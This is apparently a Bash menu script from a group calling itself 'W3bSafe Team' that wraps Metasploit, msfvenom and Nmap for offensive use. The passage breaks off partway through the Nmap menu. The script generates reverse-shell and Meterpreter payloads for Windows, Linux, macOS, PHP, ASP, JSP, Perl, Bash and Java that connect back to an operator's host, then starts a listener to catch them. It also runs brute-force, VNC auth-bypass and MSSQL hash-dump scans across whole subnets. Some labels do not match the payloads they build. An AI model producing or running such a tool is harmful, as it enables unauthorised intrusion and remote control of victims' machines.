#！ /bin/bash
LANG=zh_CN.UTF-
#Breeze gently I love you 
#Piao Ning Xue I love you !
#I like you so much. ✬
# ❤ #Code with you ❤
#By xaiJoker

meun(){
      clear
echo -e  "     "
echo -e  "\033[37m     "
echo -e  "\033[37m             _____ _                __       _____  \033[0m "                 
echo -e  "\033[37m            |____ | |              / _|     |_   _|   \033[0m"                
echo -e  "\033[37m   __      __   / / |__  ___  __ _| |_ ___    | | ___  __ _ _ __ ___ \033[0m "
echo -e  "\033[37m   \ \ /\ / /   \ \ '_ \/ __|/ _, |  _/ _ \   | |/ _ \/ _, | ,_ , _ \   \033[0m"
echo -e  "\033[37m    \ V  V /.___/ / |_) \__ \ (_| | ||  __/   | |  __/ (_| | | | | | |\033[0m"
echo -e  "\033[37m     \_/\_/ \____/|_.__/|___/\__,_|_| \___|   \_/\___|\__,_|_| |_| |_|\033[0m"
echo -e  "\033[37m                                                                   \033[0m"
                                                                  
echo -e  "     "
echo -e  "\033[1m \033[36m               #W3bSafe#Metasploit Auxiliary\033[0m"
echo -e  "     "
echo -e  "\033[1m \033[36m               #W3bSafe Team By xaiJoker \033[0m"
echo -e  "     "
echo -e  "\033[1m \033[36m               #W3bSafe Team url Www.W3bSafe.Cn\033[0m"
echo -e  "     "
echo -e  "\033[1m \033[36m               #Copyright for \033[31m##W3bSafe Team##\033[1m \033[36m Belongs to \033[0m   "
echo -e  ""
    echo -e  "\033[1m \033[33m [1]  Nmap  \033[0m "
    echo -e  "\033[1m \033[33m [2]  Msfvenom   \033[0m"
    echo -e  "\033[1m \033[33m [3]  Metasploit   \033[0m"    
    echo -e  "\033[1m \033[33m [4]  SQLmap   \033[0m    "
    echo -e  "\033[1m \033[33m [5]  WPScan   \033[0m    "
    echo -e  "\033[1m \033[33m [6]  Hydra\033[0m "
    echo -e  "     "
    echo -e  "\033[1m \033[33m Serial number > \c \033[0m"

read num
    case $num in
        1)
        clasc
        ;;
        2)
        Client
        ;;
        3)
        Metasploit
        ;;
        4)
        sqlnet
        ;;
        5)
        WPScan
        ;;
        6)
        Hydra
        ;;
        *)
        meun
        ;;
    esac
}
Client(){
clear
echo -e ""
echo -e  "\033[1m \033[33m #Metasploit ShellCode                                      \033[0m"
echo -e  "\033[1m \033[33m                                                         \033[0m" 
echo -e  "\033[1m \033[33m #Manual Generic Payload Handler \033[0m"
echo -e  "\033[1m \033[33m                                                         \033[0m" 
echo -e  "\033[1m \033[33m ##Metasploit Payload Handler \033[0m"
echo -e  "\033[1m \033[36m                                       #W3bSafe Team By xaiJoker \033[0m"
echo -e  "\033[1m \033[33m                                                         \033[0m" 
echo -e  "\033[1m \033[36m                                       #W3bSafe Team url Www.W3bSafe.Cn\033[0m" 
echo -e  "\033[1m \033[33m                                                         \033[0m" 
echo -e  "\033[1m \033[33m +-----------------------+--------------------+---------------------+"
echo -e  "\033[1m \033[33m | system Payload        | Web ShellCode      | Scripting ShellCode         "
echo -e  "\033[1m \033[33m |------------++---------+--------------------+---------------------+"
echo -e  "\033[1m \033[33m | [1] Windows ShellCode | [5] PHP  ShellCode | [9]  Perl ShellCode\033[0m "
echo -e  "\033[1m \033[33m | [2] Linux   ShellCode | [6] ASP  ShellCode | [10] Bash ShellCode  \033[0m"
echo -e  "\033[1m \033[33m | [3] Python  ShellCode | [7] JSP  ShellCode | [11] Java ShellCode\033[0m"
echo -e  "\033[1m \033[33m | [3] Python  ShellCode | [7] JSP  ShellCode | [12] dll ShellCode\033[0m"
echo -e  "\033[1m \033[33m |                       |                    | [13] back\033[0m"
echo -e  "\033[1m \033[33m +-----------------------+--------------------+---------------------+"
echo -e ""
echo -e  "\033[1m \033[33m Serial number > \c \033[0m"
read shell
    case $shell in
     1)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
echo -e  "\033[1m \033[33m name > \c \033[0m " 
read name               
            echo -e "  "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||         Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | LHOST      || $lhost"
echo -e "  | LPORT      || $lport"
echo -e "  | Name       || $name  "
echo -e "  | Payload    || Windows/meterpreter/reverse_tcp  "
echo -e "  +------------++---------------------------------+"
echo -e "  "
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $name
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> windowshandler.rc
echo "set payload windows/meterpreter/reverse_tcp" >> windowshandler.rc
echo "set LHOST $lhost" >> windowshandler.rc
echo "set LPORT $lport" >> windowshandler.rc
echo "exploit" >> windowshandler.rc
msfconsole -r windowshandler.rc
rm -rf windowshandler.rc
rm -rf $name
fi
            ;;
        2)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
echo -e  "\033[1m \033[33m name > \c \033[0m " 
read name               
            echo -e "  "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||         Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | LHOST      || $lhost"
echo -e "  | LPORT      || $lport"
echo -e "  | Name       || $name  "
echo -e "  | Payload    || Linux/x86/meterpreter/reverse_tcp  "
echo -e "  +------------++---------------------------------+"
echo -e "  "
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$lhost lport=$lport -f elf -o $name
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> linuxhandler.rc
echo "set payload linux/x86/meterpreter/reverse_tcp" >> linuxhandler.rc
echo "set LHOST $lhost" >> linuxhandler.rc
echo "set LPORT $lport" >> linuxhandler.rc
echo "exploit" >> linuxhandler.rc
msfconsole -r linuxhandler.rc
rm -rf linuxhandler.rc
rm -rf $name
fi
;;
3)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
echo -e  "\033[1m \033[33m name > \c \033[0m " 
read name               
            echo -e "  "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||         Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | LHOST      || $lhost"
echo -e "  | LPORT      || $lport"
echo -e "  | Name       || $name  "
echo -e "  | Payload    || cmd/unix/reverse_python  "
echo -e "  +------------++---------------------------------+"
echo -e "  "
msfvenom -p cmd/unix/reverse_python LHOST=$lhost LPORT=$lport -f raw > $name
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> pythonhandler.rc
echo "set payload cmd/unix/reverse_python" >> pythonhandler.rc
echo "set LHOST $lhost" >> pythonhandler.rc
echo "set LPORT $lport" >> pythonhandler.rc
echo "exploit" >> pythonhandler.rc
msfconsole -r pythonhandler.rc
rm -rf pythonhandler.rc
rm -rf $name
fi
;;
        4)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
echo -e  "\033[1m \033[33m name > \c \033[0m " 
read name               
            echo -e "  "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||         Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | LHOST      || $lhost"
echo -e "  | LPORT      || $lport"
echo -e "  | Name       || $name  "
echo -e "  | Payload    || osx/x86/meterpreter/reverse_tcp  "
echo -e "  +------------++---------------------------------+"
echo -e "  "
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $name
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> machandler.rc
echo "set payload osx/x86/shell_reverse_tcp" >> machandler.rc
echo "set LHOST $lhost" >> machandler.rc
echo "set LPORT $lport" >> machandler.rc
echo "exploit" >> machandler.rc
msfconsole -r machandler.rc
rm -rf machandler.rc
rm -rf $name
fi
;;
        5)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
echo -e  "\033[1m \033[33m name > \c \033[0m " 
read name               
            echo -e "  "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||         Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | LHOST      || $lhost"
echo -e "  | LPORT      || $lport"
echo -e "  | Name       || $name  "
echo -e "  | Payload    || php/meterpreter_reverse_tcp  "
echo -e "  +------------++---------------------------------+"
echo -e "  "
msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $name
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> phphandler.rc
echo "set payload php/meterpreter_reverse_tcp" >> phphandler.rc
echo "set LHOST $lhost" >> phphandler.rc
echo "set LPORT $lport" >> phphandler.rc
echo "exploit" >> phphandler.rc
msfconsole -r phphandler.rc
rm -rf phphandler.rc
rm -rf $name
fi
;;
        6)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
echo -e  "\033[1m \033[33m name > \c \033[0m " 
read name               
            echo -e "  "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||         Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | LHOST      || $lhost"
echo -e "  | LPORT      || $lport"
echo -e "  | Name       || $name  "
echo -e "  | Payload    || windows/meterpreter_reverse_tcp  "
echo -e "  +------------++---------------------------------+"
echo -e "  "
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f asp > $name
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> asphandler.rc
echo "set payload windows/meterpreter_reverse_tcp" >> asphandler.rc
echo "set LHOST $lhost" >> asphandler.rc
echo "set LPORT $lport" >> asphandler.rc
echo "exploit" >> asphandler.rc
msfconsole -r asphandler.rc
rm -rf asphandler.rc
rm -rf $name
fi
;;
        7)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
echo -e  "\033[1m \033[33m name > \c \033[0m " 
read name               
            echo -e "  "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||         Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | LHOST      || $lhost"
echo -e "  | LPORT      || $lport"
echo -e "  | Name       || $name  "
echo -e "  | Payload    || java/jsp_shell_reverse_tcp  "
echo -e "  +------------++---------------------------------+"
echo -e "  "
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $name
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> jsphandler.rc
echo "set payload java/jsp_shell_reverse_tcp" >> jsphandler.rc
echo "set LHOST $lhost" >> jsphandler.rc
echo "set LPORT $lport" >> jsphandler.rc
echo "exploit" >> jsphandler.rc
msfconsole -r jsphandler.rc
rm -rf jsphandler.rc
rm -rf $name
fi
;;
        8)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
echo -e  "\033[1m \033[33m name > \c \033[0m " 
read name               
            echo -e "  "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||         Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | LHOST      || $lhost"
echo -e "  | LPORT      || $lport"
echo -e "  | Name       || $name  "
echo -e "  | Payload    || java/jsp_shell_reverse_tcp  "
echo -e "  +------------++---------------------------------+"
echo -e "  "
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $name
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> warhandler.rc
echo "set payload java/jsp_shell_reverse_tcp" >> warhandler.rc
echo "set LHOST $lhost" >> warhandler.rc
echo "set LPORT $lport" >> warhandler.rc
echo "exploit" >> warhandler.rc
msfconsole -r warhandler.rc
rm -rf warhandler.rc
rm -rf $name
fi
;;
        9)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
echo -e  "\033[1m \033[33m name > \c \033[0m " 
read name               
            echo -e "  "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||         Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | LHOST      || $lhost"
echo -e "  | LPORT      || $lport"
echo -e "  | Name       || $name  "
echo -e "  | Payload    || cmd/unix/reverse_perl  "
echo -e "  +------------++---------------------------------+"
echo -e "  "
msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=$lport -f raw > $name
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> Perlhandler.rc
echo "set payload cmd/unix/reverse_perl" >> Perlhandler.rc
echo "set LHOST $lhost" >> Perlhandler.rc
echo "set LPORT $lport" >> Perlhandler.rc
echo "exploit" >> Perlhandler.rc
msfconsole -r Perlhandler.rc
rm -rf Perlhandler.rc
rm -rf $name
fi
;;
       10)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
echo -e  "\033[1m \033[33m name > \c \033[0m " 
read name               
            echo -e "  "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||         Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | LHOST      || $lhost"
echo -e "  | LPORT      || $lport"
echo -e "  | Name       || $name  "
echo -e "  | Payload    || cmd/unix/reverse_bash  "
echo -e "  +------------++---------------------------------+"
echo -e "  "
msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw > $name
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> bashhandler.rc
echo "set payload cmd/unix/reverse_bash" >> bashhandler.rc
echo "set LHOST $lhost" >> bashhandler.rc
echo "set LPORT $lport" >> bashhandler.rc
echo "exploit" >> bashhandler.rc
msfconsole -r bashhandler.rc
rm -rf bashhandler.rc
rm -rf $name
fi
;;
         11)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
echo -e  "\033[1m \033[33m name > \c \033[0m " 
read name               
            echo -e "  "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||         Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | LHOST      || $lhost"
echo -e "  | LPORT      || $lport"
echo -e "  | Name       || $name  "
echo -e "  | Payload    || java/meterpreter/reverse_tcp"
echo -e "  +------------++---------------------------------+"
echo -e "  "
msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $name
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> javahandler.rc
echo "set payload java/meterpreter/reverse_tcp" >> javahandler.rc
echo "set LHOST $lhost" >> javahandler.rc
echo "set LPORT $lport" >> javahandler.rc
echo "exploit" >> javahandler.rc
msfconsole -r javahandler.rc
rm -rf javahandler.rc
rm -rf $name
fi
;;
12)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
echo -e  "\033[1m \033[33m name > \c \033[0m " 
read name               
            echo -e "  "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||         Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | LHOST      || $lhost"
echo -e "  | LPORT      || $lport"
echo -e "  | Name       || $name  "
echo -e "  | Payload    || Windows/meterpreter/bind_tcp"
echo -e "  +------------++---------------------------------+"
echo -e "  "
msfvenom -p windows/meterpreter/bind_tcp LHOST=$lhost LPORT=$lport -f dll > $name
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> dllhandler.rc
echo "set payload windows/meterpreter/bind_tcp" >> dllhandler.rc
echo "set LHOST $lhost" >> dllhandler.rc
echo "set LPORT $lport" >> dllhandler.rc
echo "exploit" >> dllhandler.rc
msfconsole -r dllhandler.rc
rm -rf dllhandler.rc
rm -rf $name
fi
;; 
13)
meun
    ;;
     esac
}
clasc(){
    clear               
    echo -e  "  _______   _____  ____    ______    ______  " 
    echo -e  " /       \ /     \/    \  /      \  /      \ " 
    echo -e  " \$\$\$\$\$\$\$  |\$\$\$\$\$\$ \$\$\$\$  | \$\$\$\$\$\$  |/\$\$\$\$\$\$  |" 
    echo -e  " \$\$ |  \$\$ |\$\$ | \$\$ | \$\$ | /    \$\$ |\$\$ |  \$\$ |" 
    echo -e  " \$\$ |  \$\$ |\$\$ | \$\$ | \$\$ |/\$\$\$\$\$\$\$ |\$\$ |__\$\$ |" 
    echo -e  " \$\$ |  \$\$ |\$\$ | \$\$ | \$\$ |\$\$    \$\$ |\$\$    \$\$/ " 
    echo -e  " \$\$/   \$\$/ \$\$/  \$\$/  \$\$/  \$\$\$\$\$\$\$/ \$\$\$\$\$\$\$/   " 
    echo -e  "                               \$\$ |     "  
    echo -e  "                               \$\$ |    "   
    echo -e  "                               \$\$/     "        
    echo -e  "     \033[1m \033[36m                                      #Nmap Scan    \033[0m  "
    echo -e  "\033[1m \033[33m+-----------------------------------+-----------------------------------+"
    echo -e  "\033[1m \033[33m|    Single IP                      |       Intranet IP "
    echo -e  "\033[1m \033[33m|-----------------------------------+-----------------------------------"         
    echo -e  "\033[1m \033[33m| [1]  script=auth                  | [17]  script=auth  \033[0m  "
    echo -e  "\033[1m \033[33m| [2]  script=brute                 | [18]  script=brute  \033[0m  "
    echo -e  "\033[1m \033[33m| [3]  script=default               | [19]  script=default   \033[0m "
    echo -e  "\033[1m \033[33m| [4]  script=vuln                  | [20]  script=vuln  \033[0m    "
    echo -e  "\033[1m \033[33m| [5]  script=realvnc-auth-bypass   | [21]  script=realvnc-auth-bypass  \033[0m    "
    echo -e  "\033[1m \033[33m| [6]  script=vnc-auth              | [22]  script=vnc-auth \033[0m    "
    echo -e  "\033[1m \033[33m| [7]  script=broadcast             | [23]  script=broadcast \033[0m    "
    echo -e  "\033[1m \033[33m| [8]  script=vnc-info              | [24]  script=vnc-info   \033[0m    "
    echo -e  "\033[1m \033[33m| [9]  script=http-dombased-xss     | [25]  script=http-dombased-xss  \033[0m    "
    echo -e  "\033[1m \033[33m| [10] script=smb-brute.nse         | [26]  script=smb-brute.nse  \033[0m    "
    echo -e  "\033[1m \033[33m| [11] script=smb-vuln-*.nse        | [27]  script=smb-vuln-*.nse  \033[0m    "
    echo -e  "\033[1m \033[33m| [12] script=dump-hashes.nse       | [28]  script=dump-hashes.nse  \033[0m"
    echo -e  "\033[1m \033[33m| [13] script=ms-sql-brute          | [29]  script=ms-sql-brute  \033[0m"
    echo -e  "\033[1m \033[33m| [14] script=smb-enum-sessions.nse | [30]  script=smb-enum-sessions.nse  \033[0m"
    echo -e  "\033[1m \033[33m| [15] script=smb-os-discovery.nse  | [31]  script=smb-os-discovery.nse  \033[0m"
    echo -e  "\033[1m \033[33m| [16] script=smb-brute.nse blasting| [32]  script=smb-brute.nse blasting  \033[0m"
    echo -e  "\033[1m \033[33m| [33] back                         | [34]  exit                        \033[0m"
    echo -e  "\033[1m \033[33m+-----------------------------------+-----------------------------------+     "
    echo -e  "     "
    echo -e  "\033[1m \033[33m Serial number > \c \033[0m"
read num1
    case $num1 in
          1)
    echo -e  "     "
     echo -e "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap --script=auth $lhost -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
        #esac
     ;;
        2)
    echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap --script=brute $lhost -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
      3)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap --script=default $lhost -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
    4)
     echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap --script=vuln $lhost -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     5)
   echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap  --script=realvnc-auth-bypass $lhost -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     6)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap  --script=vnc-auth $lhost -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     7)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap -n -p445 --script=broadcast $lhost -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     8)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap  --script=vnc-info $lhost -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     9)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap -p 80 --script=http-dombased-xss.nse $lhost -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     10)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap --script=smb-brute.nse $lhost -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     11)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap --script=smb-vuln-*.nse $lhost -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     12)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     echo -e  "     "
     echo -e  "\033[1m \033[33m username > \c \033[0m"
     read username
     echo -e  "     "
     echo -e  "\033[1m \033[33m password > \c \033[0m"
     read password
     nmap -p 1433 --script=ms-sql-dump-hashes.nse --script-args mssql.username=$username,mssql.password=sa $lhost -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     13)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
echo -e  "     "
echo -e  "\033[1m \033[33m userdb > \c \033[0m"
     read userdb
     echo -e  "     "
echo -e  "\033[1m \033[33m passdb > \c \033[0m"
     read passdb
     nmap -p1433 --script=ms-sql-brute --script-args=userdb=$userdb,passdb=$passdb $lhost -v  
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc

     ;;
     14)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
    read lhost
    echo -e  "     "
    echo -e  "\033[1m \033[33m smbuser > \c \033[0m"
    read smbuser
    echo -e  "     "
    echo -e  "\033[1m \033[33m smbpass > \c \033[0m"
    read smbpass
    nmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=$smbuser,smbpass=$smbpass $lhost -v   
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     15)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
    echo -e  "     "
    echo -e  "\033[1m \033[33m smbuser > \c \033[0m"
    read smbuser
    echo -e  "     "
    echo -e  "\033[1m \033[33m smbpass > \c \033[0m"
    read smbpass
     nmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=$smbuser,smbpass=$smbpass $lhost -v
                     echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     16)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
    read lhost
    echo -e  "     "
    echo -e  "\033[1m \033[33m userdb > \c \033[0m"
    read userdb
    echo -e  "     "
    echo -e  "\033[1m \033[33m passdb > \c \033[0m"
    read passdb
     nmap --script=smb-brute.nse --script-args=userdb=$userdb,passdb=$passdb $lhost -v 
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
              17)
    echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap --script=auth $lhost/24 -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
        18)
    echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap --script=brute $lhost/24 -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
      19)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap --script=default $lhost/24 -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
    20)
     echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap --script=vuln $lhost/24 -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     21)
   echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap  --script=realvnc-auth-bypass $lhost/24 -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     22)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap  --script=vnc-auth $lhost/24 -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     23)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap -n -p445 --script=broadcast $lhost/24 -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     24)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap  --script=vnc-info $lhost/24 -v
                    echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     25)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap -p 80 --script=http-dombased-xss.nse $lhost/24 -v
                         echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     26)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap --script=smb-brute.nse $lhost/24 -v
                         echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     27)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     nmap --script=smb-vuln-*.nse $lhost/24 -v
                         echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     28)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
     echo -e  "     "
     echo -e  "\033[1m \033[33m username > \c \033[0m"
     read username
     echo -e  "     "
     echo -e  "\033[1m \033[33m password > \c \033[0m"
     read password
     nmap -p 1433 --script=ms-sql-dump-hashes.nse --script-args mssql.username=$username,mssql.password=sa $lhost/24 -v
                         echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     29)
echo -e  "     "
